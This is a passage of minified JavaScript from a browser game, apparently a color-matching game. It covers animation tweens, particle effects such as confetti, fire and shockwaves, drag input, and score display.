            }, n.stopLastVoiceover = function() {
                null != i && e.voiceOver[i][0].stop()
            }, n.playVoiceoverPosition = function(i) {
                t || (n.stopLastVoiceover(), e.voiceOver[i][0].play())
            }, n.playPosition = function(i, n) {
                t || e[i][n] && e[i][n].play()
            }
        },
        w = new function() {
            var e = this,
                i = 5;
            e.maxColors = t.length;
            var n = [];
            e.patterns = [], e.tutorialPatterns = [], e.friction = 10, e.increaseMaxColors = function() {
                e.setMaxColors(e.maxColors + 1)
            }, e.changeMaxColors = function(e) {
                i = r.hardLimit(e, 1, t.length)
            }, e.reset = function() {
                e.maxColors = i, e.resetPool()
            }, e.getColorLib = function() {
                return t[_.value(e.maxColors - 1, 0)]
            }, e.getColor = function() {
                return o.getRandomItem(t).color
            }, e.getColorID = function() {
                return t[_.value(e.maxColors - 1, 0)].color
            }, e.getColorData = function(e) {
                for (var i in t)
                    if (t[i].id == e) return t[i]
            }, e.getColorByID = function(e) {
                for (var i in t)
                    if (t[i].id == e) return t[i].color
            }, e.resetPool = function() {
                n = [];
                for (var i = [], r = 0; r < e.maxColors; r++) i.push(r);
                i = o.shuffle(i);
                var a = function() {
                    if (e.patterns.length) return o.cloneArray(o.getRandomItem(e.patterns));
                    var t = _.value(e.maxColors, 1);
                    for (; i.length > t;) i.shift();
                    var n = _.value(25, 10),
                        r = [];
                    for (var a in i)
                        for (var s = 0; s < n; s++) r.push(a);
                    return o.shuffle(r)
                }();
                ! function(e, r) {
                    i = o.shuffle(i);
                    var r = r || e.length,
                        a = o.clone(e);
                    if (_.chance())
                        for (var s = 0; s < e.length / 2; s++) a.push(a.shift());
                    _.chance() && a.reverse();
                    for (var s = 0; s < r; s++) {
                        for (var l = e[s]; l >= i.length;) l -= i.length;
                        n.push(t[i[l]])
                    }
                    _.chance() && (n = o.shuffle(n))
                }(a, _.value(a.length / 2, a.length / e.friction + 1))
            }, e.getFromPool = function() {
                n.length || e.resetPool();
                var t = n.shift();
                return t || (e.resetPool(), e.getFromPool())
            }
        },
        S = new function() {
            var e = this,
                t = [],
                i = [];

            function n(t, i, n, r) {
                e.remove(i), t.push(i), n && a.delay(function() {
                    S.remove(i), null != r && r()
                }, n)
            }
            XS.on("tick", function() {
                for (var e in t) t[e]()
            }), XS.on("render", function() {
                for (var e in i) i[e]();
                XS.dirty = !0
            }), e.add = function(e, i, r) {
                n(t, e, i, r)
            }, e.addRender = function(e, t, r) {
                n(i, e, t, r)
            }, e.remove = function(e) {
                a.cancel(e), o.removeItem(t, e), o.removeItem(i, e)
            }
        },
        x = (a = new function() {
            var e, t = this,
                i = {},
                n = {};
            t.delayUnique = function(e, i, n) {
                var r = new Tween(t.cancel(e || i), {}, 0);
                r.delay = n, r.callback = i
            }, t.cancel = function(e) {
                i[e] || (i[e] = {});
                var t = i[e];
                return Tween.clear(t), t
            }, t.delay = function(t, i) {
                (e = new Tween({}, {}, 0)).delay = i, e.callback = t
            }, t.store = function(e, t) {
                n[e] = i[e] = t
            }, t.onKey = function(e, t) {
                if (i[e]) {
                    var n = i[e];
                    t && delete i[e], n()
                }
            }, t.resetRegit = function() {
                for (var e in n) i[e] = n[e]
            }
        }, new function() {
            var e = this;
            e.clear = function(e) {
                Tween.clear(e), e.scale && Tween.clear(e.scale)
            }, e.blink = function(e, t, i) {
                var n = 0;
                t = t || 20;
                ! function r() {
                    if (++n < t) return e.visible = !e.visible, void s(r, .2);
                    e.visible = !i
                }()
            }, e.blinkSteroids = function(e, t) {
                var i = 0;
                ! function n() {
                    if (++i < t) return e.visible = !e.visible, scale = _.value(1.3, .7), e.scale.set(scale, scale), e.rotation = 100 * Math.random(), void s(n, .2);
                    e.visible = !0
                }()
            }, e.blinkArray = function(e, t) {
                var i = 0;
                t = t || 20;
                ! function n() {
                    if (++i < t) {
                        for (var r in e) e[r].visible = !e[r].visible;
                        return void s(n, .2)
                    }
                    for (var r in e) e[r].visible = !1
                }()
            }, e.moveTo = function(t, i, n, r, o, a, s) {
                if (t) {
                    i = i || {
                        x: 0,
                        y: 0
                    }, n = n || .5, s = s || .3, o = o || t.scale.x, a = a || o, r = r || .4;
                    var l = {
                        x: i.x + (i.x - t.x) * n,
                        y: i.y + (i.y - t.y) * n
                    };
                    Tween.clear(t), e.tweenTo(t, l, s, r, function() {
                        e.tweenTo(t, i, .5, r)
                    }), t.scale.x != o && e.scaleXYTo(t, o, a, n, r)
                }
            }, e.to = function(e, t, i, n, r) {
                r = r || .5, i = i || .5;
                var o = {};
                for (var a in t) o[a] = e[a] + (t[a] - e[a]) * r;
                new Tween(e, o, .5 * i, Tween.easein).callback = function() {
                    new Tween(e, t, .5 * i, Tween.easeout).callback = n
                }
            }, e.tweenTo = function(e, t, i, n, r) {
                i = i || .5, n = n || .5;
                var o = {};
                o.x = e.x + (t.x - e.x) * i, o.y = e.y + (t.y - e.y) * i, new Tween(e, o, .5 * n, Tween.easein).callback = function() {
                    new Tween(e, t, .5 * n, Tween.easeout).callback = r
                }
            }, e.scaleTo = function(t, i, n, r) {
                e.scaleXYTo(t, i, i, n, r)
            }, e.scaleXYTo = function(e, t, i, n, r) {
                if (e) {
                    e = e.scale, n = n || .1, r = r || .4, t = t || 1, i = i || t;
                    var o = e.x <= t ? t * (1 + n) : t * (1 - n),
                        a = e.y <= i ? i * (1 + n) : i * (1 - n);
                    (t < 0 && e.x > 0 || t > 0 && e.x < 0) && (e.x *= -1), (i < 0 && e.y > 0 || i > 0 && e.y < 0) && (e.y *= -1), Tween.clear(e), new Tween(e, {
                        x: e.x + (o - e.x) / 2,
                        y: e.y + (a - e.y) / 2
                    }, .5 * r, Tween.easein).callback = function() {
                        new Tween(e, {
                            x: o,
                            y: a
                        }, .5 * r, Tween.easeout).callback = function() {
                            new Tween(e, {
                                x: t,
                                y: i
                            }, .8 * r, Tween.easeout)
                        }
                    }
                }
            }, e.shake = function(e, t, i, n, r) {
                var o = 1;
                t = t || {
                    x: 0,
                    y: 0
                }, i = i || 20, n = n || 20, r = r || .5;
                S.addRender(function() {
                    o += .04, e.x = t.x + Math.random() * (i / o) * (Math.random() > .5 ? 1 : -1), e.y = t.y + Math.random() * (n / o) * (Math.random() > .5 ? 1 : -1)
                }, 60 * r, function() {
                    new Tween(e, t, .2, Tween.easeout)
                })
            }, e.fadeOut = function(e, t, i) {
                return e.alpha = i || e.alpha || 1, new Tween(e, {
                    alpha: 0
                }, t, Tween.easeout)
            }, e.fadeIn = function(e, t, i, n) {
                return e.alpha = null != i ? i : 0, new Tween(e, {
                    alpha: n || 1
                }, t, Tween.easeout)
            }, e.bounceScaleFloor = function(e, t, i, n, o, a) {
                var s = 60 * (o || 1),
                    l = s,
                    h = (i = i || .1, n = n || .1, t = t || {
                        x: 1,
                        y: 1
                    }, a || 0);
                S.add(function() {
                    h += .2;
                    var o = r.getPercent(--s, l) / 100,
                        a = Math.cos(h) * i * o,
                        d = Math.cos(h) * n * o;
                    e.scale.set(t.x + a, t.y + d)
                }, s, function() {
                    e.scale.set(t.x, t.y)
                })
            }, e.bounceRotation = function(e, t, i, n) {
                var o = 60 * (n || 1),
                    a = o,
                    s = (i = i || .1, t = t || 0, 999 * Math.random());

                function l() {
                    s += .2;
                    var n = r.getPercent(--o, a) / 100,
                        l = 6.28319 * Math.sin(s) * i * n;
                    e.rotation = t + l
                }
                S.add(l, o, function() {
                    e.rotation = t, S.remove(l)
                })
            }, e.bounceX = function(e, t, i, n, o) {
                var a = 60 * (n || 1),
                    s = a,
                    l = (i = i || 20, t = t || e.x, 999 * Math.random());
                o = o || .7;

                function h() {
                    l += o;
                    var n = r.getPercent(--a, s) / 100;
                    n > 50 && (n -= 50);
                    var h = 6.28319 * Math.sin(l) * i * n;
                    e.x = t + h
                }
                S.add(h, a, function() {
                    e.x = t, S.remove(h)
                })
            }, e.bounceScale = function(e, t, i, n, r) {
                e.scale.set(t, t), new Tween(e.scale, {
                    x: i,
                    y: i
                }, r, Tween.easeout).callback = function() {
                    new Tween(e.scale, {
                        x: n,
                        y: n
                    }, r / 2, Tween.easeout)
                }
            }, e.springTo = function(e, t, i, n, r) {
                if (!e._isSpringing) {
                    t = t || {
                        x: 0,
                        y: 0
                    }, n = n || .1, r = r || .9, i = i || 120;
                    e._anim = !0;
                    var a = {};
                    for (var s in t) a[s] = 0;
                    S.add(function() {
                        for (var i in t) a[i] += (t[i] - e[i]) * n, a[i] *= r, e[i] += a[i]
                    }, i, function() {
                        delete e._anim, o.extract(t, e)
                    })
                }
            }, e.spring = function(e, t, i, n) {
                t = t || {
                    x: 0,
                    y: 0
                }, i = i || .2, n = n || .8;
                var r = e._diff = e._diff || {};
                for (var o in t) r[o] || (r[o] = 0), r[o] += (t[o] - e[o]) * i, r[o] *= n, e[o] += r[o]
            }, e.kick = function(t, i, n, r) {
                var o = {
                    x: (i = i || {
                        x: 0,
                        y: 0
                    }).x + (n || 0),
                    y: i.y + (r || 0)
                };
                t.x = o.x, t.y = o.y, e.moveTo(t, i, .4, .1)
            }, e.condense = function(t, i) {
                t.alpha = 0;
                var n = t.scale.x,
                    r = t.scale.y;
                i = i || .4;
                t.scale.set(2 * n, 2 * r), e.to(t, {
                    alpha: 1
                }, i), e.scaleXYTo(t, n, r, null, i)
            }, e.jumpFall = function(e, t, i, n) {
                t = (t || -200) + e.y, i = (i || 2e3) + e.y, n = n || .9;
                new Tween(e, {
                    y: t
                }, .3 * n, Tween.easeout), s(function() {
                    new Tween(e, {
                        y: i
                    }, .7 * n, Tween.easein)
                }, .3 * n * 60)
            }, e.animNumber = function(e, t, i) {
                var n = i || 0;
                t = t || 100;
                S.add(function i() {
                    n += (t - n) / 10;
                    Math.round(n) == Math.round(t) && (S.remove(i), n = t);
                    e.setText(r.commas(Math.round(n)))
                })
            }
        }),
        b = new function() {
            this.sortY = function(e, t) {
                var i = o.sortProperty(e, "y");
                for (var n in i) t.addChild(i[n])
            }, this.sortZBodies = function(e, t) {
                var i = [];
                for (var n in e) i.push(e[n].getBody());
                var r = o.sortProperty(i, "y");
                for (var n in r) t.addChild(r[n].self)
            }, this.sort3D = function(e) {
                if (e && e.length) {
                    var t = e[0].sprite.parent,
                        i = o.sortProperty(e, "z").reverse();
                    for (var n in i) t.addChild(i[n].sprite)
                }
            }, this.removeChild = function(e) {
                if (e) {
                    var t = e.sprite || e;
                    t.parent && t.parent.removeChild(t)
                }
            }, this.toFront = function(e, t) {
                e && ((t = t || e.parent) && t.addChild(e))
            }, this.addChild = function(e, t) {
                for (var i in e) e[i] && t.addChild(e[i])
            }
        },
        _ = new function() {
            var e = this;
            e.value = function(t, i, n) {
                var r = i || 0,
                    o = Math.round(Math.random() * (t - r)) + r;
                return o == n ? e.value(t, i, n) : o
            }, e.decimal = function(e, t) {
                e = e || 999;
                var i = t || 0;
                return Math.random() * (e - i) + i
            }, e.chance = function(e) {
                return 0 != e && Math.random() <= (e || .5)
            }, e.spectrum = function(t, i) {
                var n = e.value(t, i);
                return e.chance(.5) ? n : -n
            }, e.boolean = function() {
                return !!e.chance()
            }, e.direction = function() {
                return e.chance() ? 1 : -1
            }
        },
        T = new(Container.expand(function() {
            var e = Container.call(this),
                t = [],
                i = [];
            e.blendMode = 0, u.addChild(e);
            for (var n = 0; n <= 10; n++) {
                var a = new Container;
                i.push(a), e.addChild(a)
            }

            function l(i, n, r) {
                var o = null;
                return (o = p.spawn(i || "particle")).tint = n || w.getColor(), o.alpha = 1, Tween.clear(o), o.visible = !0, o.blendMode = e.blendMode, r || t.push(o), e.addChild(o), o
            }

            function h() {
                S.add(d)
            }

            function d() {
                if (t.length)
                    for (var e = t.length - 1; e >= 0; e--) {
                        var i = t[e],
                            n = i.data,
                            r = n.ttl / n.duration;
                        if (null != n.gravity && (n.speedY += n.gravity), null != n.speedX && (i.x += n.speedX), null != n.speedY && (i.y += n.speedY), null != n.friction && (n.speedX *= n.friction, n.speedY *= n.friction), null != n.endColor && (i.tint = (n.startColor - n.endColor) * r + n.endColor), null != n.endAlpha && (i.alpha = (n.startAlpha - n.endAlpha) * r + n.endAlpha), n.cumulT && (i.scale.x = Math.sin(n.cumulT * n.vscale) * n.basicScale, n.cumulT++), null != n.endScale) {
                            var o = (n.startScale - n.endScale) * r + n.endScale;
                            i.scale.set(o, o)
                        }
                        n.ttl -= 30, 0 != n.rotation && (i.rotation += n.rotation), n.ttl <= 0 && (t.splice(e, 1), p.remove(i))
                    } else S.remove(d)
            }
            e.getLayer = function(e) {
                return i[e]
            }, e.explode = function(e, t, i, n, r, o, a) {
                for (var s = 0; s < t; s++) {
                    var d = l(null, e),
                        c = 2 * Math.PI * Math.random(),
                        u = Math.cos(c) * r * 2,
                        f = Math.sin(c) * r * 2;
                    d.x = i + u, d.y = n + f, d.data = {
                        startColor: e,
                        endColor: 0,
                        startAlpha: 1,
                        endAlpha: 0,
                        startScale: 1,
                        endScale: .2,
                        speedX: u,
                        speedY: f,
                        rotation: 0,
                        duration: o,
                        ttl: o,
                        gravity: a
                    }
                }
                h()
            }, e.confetti = function(e) {
                e = e || 20;
                for (var t = 0; t < e; t++) {
                    var i = l("confetti_0" + _.value(6, 1), 16777215);
                    i.blendMode = 0, i.x = _.spectrum(2e3) + c.getCenterX(), i.y = _.spectrum(2e3), i.scale.y = .5 * Math.random() + .5, i.data = {
                        speedY: 25 * Math.random() + 20,
                        rotation: (5 + 5 * Math.random()) * (2 * (2 * Math.random() >> 0) - 1) / 100,
                        vscale: .1 * Math.random() + .1,
                        cumulT: _.value(1e3),
                        basicScale: i.scale.y,
                        duration: 1e4,
                        ttl: 1e4
                    }, stage.addChild(i)
                }
                h()
            }, e.explodeObstacle = function(i, n) {
                for (var o = (n = n || {}).color, a = n.texture, s = n.scale || 4, d = n.speed || 20, c = n.duration || 1500, u = (n.gravity, n.amount || 10), f = _.decimal(), p = 0; p < u; p++) {
                    var g = l(a || "circle", o),
                        v = r.degreeToRadians(360 / u * p + f),
                        m = Math.cos(v) * d,
                        y = Math.sin(v) * d;
                    g.x = i.x + m, g.y = i.y + y, g.data = {
                        startScale: s,
                        endScale: .1 * s,
                        startAlpha: 1,
                        endAlpha: 0,
                        speedX: m,
                        speedY: y,
                        rotation: Math.random(),
                        duration: c,
                        ttl: c
                    }, t.push(g), e.addChild(g), n.parent && n.parent.addChild(g)
                }
                h()
            }, e.trail = function(t, i) {
                var n = (i = i || {}).container,
                    r = i.radius || 0,
                    o = i.startColor || (_.chance(.8) ? w.getColor() : 16777215),
                    a = i.startScale || .1,
                    s = i.endScale || .1 * a,
                    d = i.gravity || 0,
                    c = i.texture || "glowingDot",
                    u = i.startAlpha || 1,
                    f = i.speedX || 0,
                    p = i.speedY || -5,
                    g = l(c);
                _.chance() && (g.blendMode = 1);
                Math.PI, Math.random();
                g.x = t.x + Math.random() * r, g.y = t.y + Math.random() * r, g.rotation = 1.5 * Math.random(), g.scale.set(a, a);
                if (g.tint = o, g.data = {
                        startAlpha: u,
                        endAlpha: 0,
                        startScale: a * Math.random(),
                        endScale: s,
                        speedX: f,
                        speedY: p,
                        rotation: 0,
                        duration: 1e3,
                        ttl: 1e3,
                        gravity: d
                    }, h(), n) return n.addChild(g);
                e.getLayer(4).addChild(g)
            }, e.fire = function(i, n, r, o, a) {
                var s = l(r, _.chance(.3) ? 0 : a || 16776960),
                    d = 2 * Math.PI * Math.random();
                n = Math.random() * (n || 10) + 5;
                s.x = i.x + Math.cos(d) * n, s.y = i.y + Math.sin(d) * n, s.rotation = 1.5 * Math.random();
                o = o || .12;
                s.blendMode = 1, s.data = {
                    startAlpha: .3 + Math.random() / 2,
                    endAlpha: 0,
                    startScale: o * (1 + Math.random()),
                    endScale: .2 * o,
                    speedX: 0,
                    speedY: 0,
                    rotation: Math.random() / 100,
                    duration: 1500,
                    ttl: 1500,
                    gravity: -.1 - .1 * Math.random()
                }, t.push(s), e.getLayer(2).addChild(s), h()
            }, e.splatt = function(t, i) {
                for (var n = n || 10, r = (i = i || {}).color, o = i.texture || "circle", a = (n = i.amount || 10, i.scale || 1), s = i.container, d = i.radius || 16, c = null != i.blendMode ? i.blendMode : e.blendMode, u = 0; u < n; u++) {
                    var f = l(o, r);
                    s && s.addChild(f), f.blendMode = c;
                    var p = 2 * Math.PI * Math.random(),
                        g = Math.cos(p) * d,
                        v = Math.sin(p) * d * .5 - 25 * Math.random();
                    f.x = t.x + g, f.y = t.y + v, f.rotation = p;
                    var m = Math.abs(1e3 * Math.random() + 500);
                    f.data = {
                        startAlpha: 1,
                        endAlpha: 0,
                        startScale: _.value(10 * a, 5 * a) / 10,
                        endScale: a * Math.random() * .2,
                        speedX: g,
                        speedY: v,
                        rotation: p / 50,
                        duration: m,
                        ttl: m,
                        friction: .99,
                        gravity: 1
                    }
                }
                h()
            }, e.sparkle = function(i, n) {
                for (var r = 0; r < 4; r++) a(i.x, i.y, -Math.PI / 2), a(i.x, i.y, Math.PI / 2);

                function a(i, r, a) {
                    var s = l();
                    s.alpha = 1, s.tint = n || w.getColor(), o.removeItem(t, s);
                    var h = Math.PI * Math.random() + a,
                        d = 200 * Math.random() + 200,
                        c = 20 * Math.random() + 20,
                        u = -.5 * Math.random() * 15,
                        f = .7 * Math.random() + .75,
                        g = f - .5 * Math.random() + .25;
                    s.scale.set(d / 400, d / 400), s.x = i + 108 * Math.cos(h) - 50, s.y = r + 108 * Math.sin(h) - 50, s.visible = !0, e.addChild(s), Tween.clear(s), new Tween(s, {
                        x: s.x + Math.cos(h) * c,
                        y: s.y + Math.sin(h) * c,
                        rotation: u
                    }, f, Tween.easeout), XS.setTimeout(function() {
                        new Tween(s, {
                            alpha: 0
                        }, g, Tween.easeout).callback = function() {
                            p.remove(s)
                        }
                    }, 1e3 * (f - g))
                }
                h()
            }, e.shockwave = function(e, t) {
                var i = (t = t || {}).color,
                    n = t.texture || "shockwave",
                    r = t.scale || 2,
                    o = t.time || .4,
                    a = t.delay || 0,
                    h = t.alpha || 1,
                    d = t.initScale || .5 * r,
                    c = l(n, i, !0);
                return c.x = e.x, c.y = e.y, c.alpha = h, c.scale.set(d, d), new Tween(c.scale, {
                    x: r,
                    y: r
                }, o, Tween.easeout), new Tween(c, {
                    alpha: 0
                }, o, Tween.easeout).delay = a, s(function() {
                    p.remove(c)
                }, 60 * o), c
            }, e.kaboom = function(i, n, r, a) {
                var h = l("condense", n);
                o.removeItem(t, h);
                a = a || 1;
                return h.x = i.x, h.y = i.y, h.scale.set(a, a), h.tint = n || w.getColor(), new Tween(h.scale, {
                    x: 2 * a,
                    y: 2 * a
                }, 1, Tween.easeout), x.blink(h, 10), s(function() {
                    h.parent && h.parent.addChild(e.shockwave(h, {
                        color: n,
                        scale: 3 * a
                    })), p.remove(h)
                }, r || 20), h
            }, e.condense = function(t, i) {
                var n = (i = i || {}).color,
                    r = i.texture || "condense",
                    o = i.scale || 1,
                    a = i.time || .5,
                    s = (i.delay, i.alpha, i.initScale || 2 * o),
                    h = l(r, n, !0);
                return h.x = t.x, h.y = t.y, h.alpha = 0, h.scale.set(s, s), e.addChild(h), new Tween(h.scale, {
                    x: .5 * o,
                    y: .5 * o
                }, a, Tween.easeout), new Tween(h, {
                    alpha: .5
                }, .5 * a, Tween.easeout).callback = function() {
                    new Tween(h, {
                        alpha: 0
                    }, .5 * a, Tween.easeout).callback = function() {
                        p.remove(h)
                    }
                }, h
            }, e.linewave = function(t, i, n, o) {
                var a = p.spawn("linewave");
                a.alpha = .5, a.tint = i, a.x = t.x, a.y = t.y, a.rotation = n ? 0 : r.degreeToRadians(90), a.scale.set(.9, .9);
                var s = {
                        x: a.x,
                        y: a.y,
                        alpha: .2
                    },
                    l = {
                        x: 8,
                        y: o
                    };
                x.blink(a, 10), new Tween(a, s, .5, Tween.linear), new Tween(a.scale, l, .5, Tween.linear).callback = function() {
                    p.remove(a)
                }, e.addChild(a)
            }, e.radialLines = function(e, t) {
                var i = [];
                for (var n in t) {
                    var r = m.cycle("Line");
                    r.alpha = .3, r.draw(1, e.getColor(), e.x, e.y, t[n].x, t[n].y), r.visible = !0, i.push(r), Particles.addChild(r)
                }
                x.blinkArray(i, 10)
            }, e.radialBolts = function(e, t, i) {
                for (var n in t) m.cycle("Bolt").draw(e, t[n], i)
            }, e.collect = function(e, t, i, n, r) {
                var o = Sheets.spawn(e);
                o.play(), o.alpha = 1, o.visible = !0, o.x = t.x + u.x + c.x, o.y = t.y + u.y + c.y;
                var a = 1.1 + _.spectrum(5) / 50;
                r ? (a *= 1 * stage.ratio, stage.addChild(o)) : (a *= .3 * XS.devicePixelRatio, XS.stageContainer.addChild(o)), o.scale.set(a, a);
                var s = 1.4 * a,
                    l = 1 * a;
                o.rotation += 2 * Math.random() - Math.random(), new Tween(o, {
                    rotation: _.spectrum(20) / 10
                }, .3, Tween.easeout), new Tween(o.scale, {
                    x: -s,
                    y: s
                }, .3, Tween.easeout).callback = function() {
                    new Tween(o.scale, {
                        x: l,
                        y: l
                    }, .5, Tween.easein), new Tween(o, {
                        x: i.x,
                        y: i.y,
                        rotation: _.spectrum(20) / 10
                    }, .6, Tween.easein).callback = function() {
                        null != n && n(), Sheets.remove(o)
                    }
                }
            }, e.shockwaveSheet = function(t, i, n, r) {
                var o = Sheets.spawn("explosion");
                Tween.clear(o);
                var a = n || 1.5;
                return o.x = t.x, o.y = t.y, o.scale.set(.5, .5), o.visible = !0, e.addChild(o), new Tween(o.scale, {
                    x: a,
                    y: a
                }, 1, Tween.easeout), o.play(0, 1), s(function() {
                    Sheets.remove(o)
                }, 60), o
            }
        })),
        C = new(Container.expand(function() {
            var e, t, i, n = [],
                r = Container.call(this),
                o = {
                    x: 0,
                    y: 0
                },
                a = {
                    x: 0,
                    y: 0
                };

            function s(e, t) {
                t && (n = []);
                var i = e.event.getLocalPosition(u);
                r.x = i.x / stage.ratio, r.y = i.y / stage.ratio;
                var o = {
                    x: r.x,
                    y: r.y
                };
                n.length || n.push(o);
                var a = n[n.length - 1];
                a.x != o.x && a.y != o.y && n.push(o), r.velocity.x = o.x - a.x, r.velocity.y = o.y - a.y
            }

            function l() {
                i && (a.x = r.x + o.x, a.y = r.y + o.y, i.x += (a.x - i.x) / 5, i.y += (a.y - i.y) / 5)
            }
            r.velocity = {
                x: 0,
                y: 0
            }, r.isDown = function() {
                return e
            }, stage.on("down", function(t) {
                s(t, !0), e = !0
            }), stage.on("up", function(t) {
                e = !1, r.stopDrag()
            }), stage.on("move", function(e) {
                s(e, !1)
            }), r.getHistory = function() {
                return n
            }, r.resetHistory = function() {
                n = []
            }, r.stopDrag = function() {
                S.remove(l), i && (new Tween(i, a, .2), null != t && t(), t = null, i = null)
            }, r.startDrag = function(e, n) {
                t = n, i = e, b.toFront(i, u), o.x = i.x - r.x, o.y = i.y - r.y, S.add(l)
            }
        }));
    T.addChild(C);
    var R = Container.expand(function() {
            var e = Container.call(this);
            e.image;
            e.thickness = 1, e.texture, e.reset = function() {}, e.draw = function(t, i, n, r, o, a) {
                e.x = n, e.y = r, e.thickness = t || 1;
                var s = o - n,
                    l = a - r;
                e.x2 = o, e.y2 = a;
                var h = Math.sqrt(s * s + l * l);
                0 != h && (e.image.scale.set(h / 2048, t), e.rotation = Math.atan2(l, s), e.image.tint = i)
            }, e.changePosition = function(t, i, n, r) {
                e.draw(e.thickness, e.image.tint, t, i, n, r)
            }, e.setTint = function(t) {
                e.image.tint = t
            }, e.setTexture = function(t) {
                p.remove(e.image), e.image = p.spawn(t || "Line"), e.image.anchor.set(0, .5), e.image.blendMode = T.blendMode, e.addChild(e.image), e.isWildcard = "LineWildcard" == t
            }, e.setTexture()
        }),
        M = new(Container.expand(function() {
            var e = Container.call(this);
            e.alpha = .3, u.addChild(e), e.add = function(t) {
                t.tint = 0, e.addChild(t)
            }
        })),
        E = new function() {
            var e = this,
                t = {},
                i = [],
                o = {};

            function s(e, t, i) {
                Tween.clear(e), e.alpha = 0, e.x = t.x, e.y = t.y + 100;
                var n = t.y - 500;
                T.addChild(e), new Tween(e, {
                    alpha: 1
                }, .5, Tween.easein), new Tween(e, {
                    y: t.y + (n - t.y) / 2
                }, 1, Tween.easein).callback = function() {
                    new Tween(e, {
                        alpha: 0,
                        y: n
                    }, 1, Tween.easeout).callback = function() {
                        b.removeChild(e), i && i.push(e)
                    }
                }
            }
            e.showPoints = function(t, i, n) {
                return e.showMessage(r.commas(t), i, 2 * t, n)
            }, e.showMessage = function(t, i, n, a) {
                o[t] || (o[t] = []);
                n = r.hardLimit(n || 0, 0, 150);
                var l = o[t].shift() || e.spawnText("stroke");
                return l.setText(t), l.tint = a || 16777215, s(l, i, o[t]), l
            }, e.showBitmap = function(e, i) {
                var n = t[e];
                n || (n = t[e] = p.spawn(e)), s(n, i)
            }, e.spawnText = function(e, t, i) {
                e = e || "normal";
                var r = new BitmapFont(n[e]);
                return r.textAlign = r.verticalAlign = "center", r.setText(t || "0"), T.addChild(r), i && (r.x = i.x, r.y = i.y), r.tint = 16777215, r
            }, e.showCombo = function(e, t) {
                var i, n = m.spawn("Particle"),
                    r = m.spawn("Particle"),
                    o = p.spawn("halo"),
                    s = p.spawnGroup("x" + e),
                    l = p.spawn("x"),
                    h = -20,
                    d = h - 5;
                for (var c in n.x = t.x, n.y = t.y, o.tint = w.getColorByID("x" + e), l.x = -90, l.y = 250, r.x = 90, r.y = l.y + 100, n.addChild(o), n.addChild(l), n.addChild(r), s) r.addChild(s[c]);

                function u() {
                    o.rotation += .02;
                    if ((h += .7) > 0 && (h *= .91), (d += .7) > 0 && (d *= .91), l.y += h, r.y += d, i)
                        for (var e in s) {
                            var t = s[e];
                            t.x += t.speedX, t.y += t.speedY
                        }
                }
                T.getLayer(4).addChild(n), n.scale.set(3, 3), l.alpha = 0, r.alpha = 0, o.scale.set(.1, .1), new Tween(n.scale, {
                    x: .9,
                    y: .9
                }, .3, Tween.easeout), new Tween(l, {
                    alpha: 1
                }, .1, Tween.easeout), new Tween(r, {
                    alpha: 1
                }, .1, Tween.easeout).delay = 10, new Tween(o.scale, {
                    x: 1,
                    y: 1
                }, .1, Tween.easeout), S.addRender(u), a.delay(function() {
                    new Tween(l, {
                        alpha: 0
                    }, .3, Tween.easeout).delay = 10, new Tween(r, {
                        alpha: 0
                    }, .3, Tween.easeout).delay = 20, new Tween(n, {
                        alpha: 0
                    }, .3, Tween.easeout).delay = 20, new Tween(n.scale, {
                        x: 2,
                        y: 2
                    }, .3, Tween.easein).delay = 10, i = !0
                }, 40), a.delay(function() {
                    for (var e in S.remove(u), s) p.remove(s[e]);
                    p.remove(o), p.remove(l), m.remove(n), m.remove(r)
                }, 70)
            }, e.readysetgo = function() {
                i = ["ready", "set", "go"],
                    function t() {
                        if (!i.length) return a.onKey("onReadySetGo", !1);
                        var n = i.shift();
                        y.play(n), e.showWord(n, i.length ? 33 : 40, t)
                    }()
            }, e.showWord = function(e, t, i, n) {
                var r = 1024,
                    o = 1024,
                    s = m.spawn("Particle"),
                    l = m.spawn("Particle"),
                    h = p.spawn("halo"),
                    d = t || 40,
                    c = p.spawnGroup(e),
                    u = !1,
                    f = .55 * d;
                for (var g in s.x = r, s.y = o, n && (h.tint = w.getColorByID(n), s.addChild(h)), s.addChild(l), c) l.addChild(c[g]);
                T.getLayer(4).addChild(s), s.scale.set(5, 5), l.alpha = 0;
                var v = d / 4,
                    y = d / 133,
                    x = d / 400;

                function b() {
                    if (h.rotation += .02, u)
                        for (var e in c) {
                            var t = c[e];
                            t.x += t.speedX, t.y += t.speedY
                        }
                }
                new Tween(s.scale, {
                    x: 1,
                    y: 1
                }, y, Tween.easeout), new Tween(l, {
                    alpha: 1
                }, x, Tween.easeout).delay = v, S.addRender(b), a.delay(function() {
                    new Tween(l, {
                        alpha: 0
                    }, y, Tween.easeout).delay = v, new Tween(s, {
                        alpha: 0
                    }, y, Tween.easeout).delay = v, new Tween(s.scale, {
                        x: 4,
                        y: 4
                    }, y, Tween.easein).delay = v, u = !0
                }, f), a.delay(function() {
                    for (var e in S.remove(b), c) p.remove(c[e]);
                    p.remove(h), m.remove(s), m.remove(l), null != i && i()
                }, d)
            }
        };
    myScore = Container.expand(function() {
        var e = Container.call(this);
        e.score = 0, e.highscore = 0;
        var t = E.spawnText(),
            i = E.spawnText(),
            n = E.spawnText(),
            o = E.spawnText(),
            a = p.spawn("crown"),
            s = p.spawn("crown"),
            l = new Container,
            h = 4;
        s.tint = n.tint = o.tint = 0, s.x = s.y = n.x = n.y = o.y = o.x = h, l.addChild(s), l.addChild(a), l.y = 240, e.isHighscore = !1;
        var c = 0,
            u = 0,
            f = 0;

        function g() {
            c = e.score, u = e.highscore, m(), S.remove(v)
        }

        function v() {
            if (c > e.score && (c = e.score), u > e.highscore && (u = e.highscore), Math.round(c) == Math.round(e.score)) return g();
            c += (e.score - c) / 10, u += (e.highscore - u) / 10, m()
        }

        function m() {
            n.setText(r.commas(Math.round(c))), o.setText(r.commas(Math.round(u))), t.setText(r.commas(Math.round(c))), i.setText(r.commas(Math.round(u))), f != i.getPixelWidth() * i.scale.x && (f = i.getPixelWidth() * i.scale.x, i.x = -f / 2 + 45, l.x = i.x - 40, o.x = i.x + h, o.y = i.y + h)
        }
        i.y = 245, e.multiplier = 1, t.verticalAlign = n.verticalAlign = "top", t.tint = i.tint = 16777215, i.textAlign = o.textAlign = "left", i.scale.set(.25, .25), o.scale.set(.25, .25), n.alpha = o.alpha = s.alpha = .4, e.y = 50, e.offset = {
            x: 0,
            y: 0
        }, e.addChild(o), e.addChild(n), e.addChild(i), e.addChild(t), e.addChild(l), stage.addChild(e), e.reset = function() {
            e.multiplier = 1, e.score = 0, e.isHighscore = !1, e.refresh()
        }, e.refresh = function() {
            e.highscore = d.state.highscore || 0, g()
        }, XS.on("resize", function() {
